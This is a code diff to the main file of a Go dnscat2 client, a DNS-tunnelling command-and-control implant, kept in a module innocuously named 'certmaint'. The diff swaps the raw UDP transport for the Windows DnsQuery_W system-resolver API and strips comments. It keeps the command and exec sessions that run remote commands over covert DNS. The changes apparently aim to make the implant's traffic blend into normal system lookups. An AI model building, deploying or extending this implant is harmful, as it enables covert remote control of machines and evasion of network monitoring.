@@ -1,4 +1,8 @@
-// Package main implements the dnscat2 client.
+// Package main implements the dnscat2 client using the Windows DNS Client API
+// (DnsQuery_W) transport instead of a raw UDP socket.
+//
+// All session, protocol, and controller logic is identical to cmd/dnscat.
+// The only difference is the transport: pkg/tunnel/dnsapi instead of pkg/tunnel/dns.
 package main
 
 import (
@@ -11,7 +15,7 @@ import (
 	"certmaint/pkg/dlog"
 	"certmaint/pkg/driver/command"
 	"certmaint/pkg/session"
-	"certmaint/pkg/tunnel/dns"
+	"certmaint/pkg/tunnel/dnsapi"
 )
 
 const (
@@ -34,7 +38,6 @@ var (
 func main() {
 	rand.Seed(time.Now().UnixNano())
 
-	// Command line flags with build-time defaults
 	var (
 		domain        string
 		dnsServer     string
@@ -52,7 +55,7 @@ func main() {
 	)
 
 	flag.StringVar(&domain, "domain", DefaultDomain, "Domain to tunnel through (e.g., example.com)")
-	flag.StringVar(&dnsServer, "dns-server", DefaultServer, "DNS server to use")
+	flag.StringVar(&dnsServer, "dns-server", DefaultServer, "DNS server to use (informational; DnsQuery_W uses system resolver)")
 	flag.UintVar(&dnsPort, "dns-port", 53, "DNS port")
 	flag.StringVar(&dnsTypes, "dns-type", DefaultDNSTypes, "DNS record types to use")
 	flag.StringVar(&secret, "secret", DefaultSecret, "Pre-shared secret for authentication")
@@ -66,7 +69,7 @@ func main() {
 	flag.IntVar(&isn, "isn", -1, "Initial sequence number (for debugging)")
 
 	flag.Usage = func() {
-		dlog.Fprintf(os.Stderr, "%s %s - DNS tunnel client\n\n", Name, Version)
+		dlog.Fprintf(os.Stderr, "%s %s - DNS tunnel client (DnsQuery_W transport)\n\n", Name, Version)
 		dlog.Fprintf(os.Stderr, "Usage: %s [options] [domain]\n\n", os.Args[0])
 		dlog.Fprintf(os.Stderr, "Options:\n")
 		flag.PrintDefaults()
@@ -78,12 +81,10 @@ func main() {
 
 	flag.Parse()
 
-	// Handle positional argument as domain
 	if flag.NArg() > 0 {
 		domain = flag.Arg(0)
 	}
 
-	// Configure session settings
 	session.PacketTrace = packetTrace
 	session.PacketDelay = time.Duration(delay) * time.Millisecond
 	session.DoEncryption = !noEncryption
@@ -91,20 +92,17 @@ func main() {
 
 	controller.SetMaxRetransmits(maxRetransmit)
 
-	// Determine DNS server
 	if dnsServer == "" {
 		if domain == "" {
 			dlog.Println("Starting DNS driver without a domain!")
 			dlog.Println()
 		}
-		// Use system DNS
 		dnsServer = getSystemDNS()
 		if dnsServer == "" {
-			dnsServer = "8.8.8.8" // Fallback
+			dnsServer = "8.8.8.8"
 		}
 	}
 
-	// Print warnings if connecting without domain
 	if domain == "" {
 		dlog.Println("** WARNING!")
 		dlog.Println("* No domain specified — direct UDP mode.")
@@ -112,7 +110,6 @@ func main() {
 		dlog.Println()
 	}
 
-	// Create session based on mode
 	var sess *session.Session
 	var err error
 
@@ -126,7 +123,6 @@ func main() {
 		dlog.Printf("Creating an exec session!\n")
 		sess, err = session.NewExecSession(doExec, doExec)
 	} else {
-		// Default to command session
 		dlog.Println("Creating a command session!")
 		sess, err = newCommandSession("command")
 	}
@@ -138,19 +134,16 @@ func main() {
 
 	controller.AddSession(sess)
 
-	// Print driver info
 	dlog.Println()
-	dlog.Println("Creating DNS driver:")
+	dlog.Println("Creating DNS API driver (DnsQuery_W):")
 	dlog.Printf(" domain = %s\n", stringOrNull(domain))
-	dlog.Printf(" host   = 0.0.0.0\n")
 	dlog.Printf(" port   = %d\n", dnsPort)
 	dlog.Printf(" type   = %s\n", dnsTypes)
-	dlog.Printf(" server = %s\n", dnsServer)
+	dlog.Printf(" server = %s (system resolver; field informational only)\n", dnsServer)
 
-	// Create and run DNS driver
-	dnsDriver, err := dns.NewDriver(domain, "0.0.0.0", uint16(dnsPort), dnsTypes, dnsServer)
+	dnsDriver, err := dnsapi.NewDriver(domain, "0.0.0.0", uint16(dnsPort), dnsTypes, dnsServer)
 	if err != nil {
-		dlog.Printf("Failed to create DNS driver: %v\n", err)
+		dlog.Printf("Failed to create DNS API driver: %v\n", err)
 		os.Exit(1)
 	}
 
@@ -160,7 +153,6 @@ func main() {
 	dnsDriver.Run()
 }
 
-// newCommandSession creates a command session
 func newCommandSession(name string) (*session.Session, error) {
 	sess, err := session.New(name)
 	if err != nil {
@@ -169,7 +161,6 @@ func newCommandSession(name string) (*session.Session, error) {
 
 	cmdDriver := command.NewDriver()
 
-	// Set up callbacks
 	cmdDriver.CreateSession = func(name, cmd string) uint16 {
 		newSess, err := session.NewExecSession(name, cmd)
 		if err != nil {
